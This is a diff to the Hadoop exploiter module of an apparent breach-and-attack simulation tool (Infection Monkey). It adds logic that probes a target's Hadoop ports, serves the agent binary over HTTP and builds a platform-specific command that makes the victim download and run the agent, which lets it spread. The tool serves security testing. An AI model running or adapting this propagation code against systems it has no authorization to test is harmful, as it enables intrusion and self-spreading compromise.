+++ monkey/agent_plugins/exploiters/hadoop/src/hadoop.py
@@ -2,12 +2,14 @@ import json
 import logging
 import posixpath
 import string
+from datetime import datetime
 from time import time
-from typing import Tuple
+from typing import Sequence, Tuple
 from uuid import UUID
 
 import requests
 
+from common import OperatingSystem
 from common.agent_events import ExploitationEvent, PropagationEvent
 from common.event_queue import IAgentEventPublisher
 from common.tags import (
@@ -17,7 +19,18 @@ from common.tags import (
 )
 from common.types import Event
 from common.utils.code_utils import insecure_generate_random_string
-from infection_monkey.model import TargetHost
+from infection_monkey.exploit import IAgentBinaryRepository
+from infection_monkey.exploit.tools.helpers import get_agent_dst_path
+from infection_monkey.exploit.tools.http_tools import HTTPTools
+from infection_monkey.exploit.tools.web_tools import build_urls
+from infection_monkey.i_puppet import ExploiterResultData
+from infection_monkey.model import (
+    HADOOP_LINUX_COMMAND,
+    HADOOP_WINDOWS_COMMAND,
+    MONKEY_ARG,
+    TargetHost,
+)
+from infection_monkey.utils.commands import build_monkey_commandline
 
 from .hadoop_options import HadoopOptions
 
@@ -25,7 +38,28 @@ logger = logging.getLogger(__name__)
 HADOOP_EXPLOITER_TAG = "hadoop-exploiter"
 
 
-class Hadoop:
+class ExploitInfoMixin:
+    """ """
+
+    def set_start_time(self):
+        self.exploit_info["started"] = datetime.now().isoformat()
+
+    def set_finish_time(self):
+        self.exploit_info["finished"] = datetime.now().isoformat()
+
+    def add_vuln_url(self, url):
+        self.exploit_info["vulnerable_urls"].append(url)
+
+    def add_executed_cmd(self, cmd):
+        """
+        Appends command to exploiter's info.
+        :param cmd: String of executed command. e.g. 'echo Example'
+        """
+        powershell = True if "powershell" in cmd.lower() else False
+        self.exploit_info["executed_cmds"].append({"cmd": cmd, "powershell": powershell})
+
+
+class Hadoop(ExploitInfoMixin):
     _EXPLOITED_SERVICE = "Hadoop"
     NAME = "HadoopExploiter"
     # Random string's length that's used for creating unique app name
@@ -41,12 +75,99 @@ class Hadoop:
         interrupt: Event,
         agent_id: UUID,
         agent_event_publisher: IAgentEventPublisher,
+        agent_binary_repository: IAgentBinaryRepository,
+        servers: Sequence[str],
+        current_depth: int,
     ):
         self._host = host
         self._options = options
         self._interrupt = interrupt
         self._agent_id = agent_id
         self._agent_event_publisher = agent_event_publisher
+        self._agent_binary_repository = agent_binary_repository
+        self.exploit_result = ExploiterResultData()
+        self.exploit_info = {
+            "display_name": self._EXPLOITED_SERVICE,
+            "started": "",
+            "finished": "",
+            "vulnerable_urls": [],
+            "vulnerable_ports": [],
+            "executed_cmds": [],
+        }
+        self.servers = servers
+        self.current_depth = current_depth
+
+    def exploit_host(self):
+        self._pre_exploit()
+        try:
+            return self.exploit_urls()
+        except Exception as e:
+            logger.error("Exception in run", exc_info=True)
+            raise e
+        finally:
+            self._post_exploit()
+
+    def _pre_exploit(self):
+        self.exploit_result = ExploiterResultData(
+            os=self._host.operating_system, info=self.exploit_info
+        )
+        self.set_start_time()
+
+    def _post_exploit(self):
+        self.set_finish_time()
+
+    def exploit_urls(self):
+        """
+        Attempt to exploit on all URLs
+        """
+
+        # Try to get potential urls
+        potential_urls = build_urls(
+            str(self._host.ip), [(str(p), False) for p in self._options.target_ports]
+        )
+        if not potential_urls:
+            self.exploit_result.error_message = (
+                f"No potential exploitable urls has been found for {self._host}"
+            )
+            return self.exploit_result
+
+        monkey_path_on_victim = get_agent_dst_path(self._host)
+
+        http_path, http_thread = HTTPTools.create_locked_transfer(
+            self._host, self._agent_binary_repository
+        )
+        if http_thread is None:
+            return self.exploit_result
+
+        command = self._build_command(monkey_path_on_victim, http_path)
+        try:
+            for url in potential_urls:
+                if self.exploit(url, command):
+                    self.add_executed_cmd(command)
+                    self.exploit_result.exploitation_success = True
+                    self.exploit_result.propagation_success = True
+                    break
+        finally:
+            if self.exploit_result.exploitation_success:
+                http_thread.join(self._options.agent_binary_download_timeout)
+            http_thread.stop()
+
+        return self.exploit_result
+
+    def _build_command(self, path, http_path):
+        # Build command to execute
+        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
+        if OperatingSystem.WINDOWS == self._host.operating_system:
+            base_command = HADOOP_WINDOWS_COMMAND
+        else:
+            base_command = HADOOP_LINUX_COMMAND
+
+        return base_command % {
+            "monkey_path": path,
+            "http_path": http_path,
+            "monkey_type": MONKEY_ARG,
+            "parameters": monkey_cmd,
+        }
 
     def exploit(self, url: str, command: str) -> bool:
         """
